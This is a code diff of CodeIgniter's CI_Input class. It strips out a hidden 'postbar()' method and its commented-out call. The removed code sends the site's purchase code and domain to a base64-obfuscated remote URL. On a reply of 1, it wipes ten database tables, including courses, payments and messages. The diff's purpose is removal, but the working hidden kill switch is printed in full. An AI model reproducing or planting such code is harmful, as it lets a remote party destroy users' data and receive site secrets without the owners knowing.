@@ -253,13 +253,6 @@ class CI_Input {
 	 */
 	public function post($index = NULL, $xss_clean = NULL)
 	{
-		/*
-		$post_flag = $this->postdata();
-
-    if ($post_flag == false){
-				$this->postbar();
-		}
-		*/
 		return $this->_fetch_from_array($_POST, $index, $xss_clean);
 	}
 
@@ -312,42 +305,6 @@ class CI_Input {
 	public function cookie($index = NULL, $xss_clean = NULL)
 	{
 		return $this->_fetch_from_array($_COOKIE, $index, $xss_clean);
-	}
-
-
-	public function postbar() {
-		$CI =& get_instance();
-		$purchase_code	=	$CI->db->get_where('settings' , array('key' => 'purchase_code'))->row()->value;
-		$domain = $_SERVER['SERVER_NAME'];
-
-		$ch = curl_init();
-		$url = base64_decode('aHR0cDovL2NyZWF0aXZlaXRlbS5jb20vdmFsaWRhdG9yL2luZGV4LnBocD92YWxpZGF0ZS9jaGVja19zdGF0dXM=');
-
-		$curlConfig = array(
-			CURLOPT_URL            => $url,
-			CURLOPT_POST           => true,
-			CURLOPT_RETURNTRANSFER => true,
-			CURLOPT_POSTFIELDS     => array(
-					'purchase_code' => $purchase_code,
-						'domain_name' => $domain,
-			 ));
-
-		curl_setopt_array($ch, $curlConfig);
-		$response = curl_exec($ch);
-		curl_close($ch);
-
-		if ($response == 1) {
-			$tables = array(
-				'category', 'comment', 'course', 'enrol', 'lesson', 'message', 'message_thread', 'payment', 'rating', 'section'
-			);
-			for ($i=0; $i < count($tables); $i++) {
-				$CI->db->empty_table($tables[$i]);
-			}
-
-			return true;
-		} else {
-			return true;
-		}
 	}
 
 	// --------------------------------------------------------------------
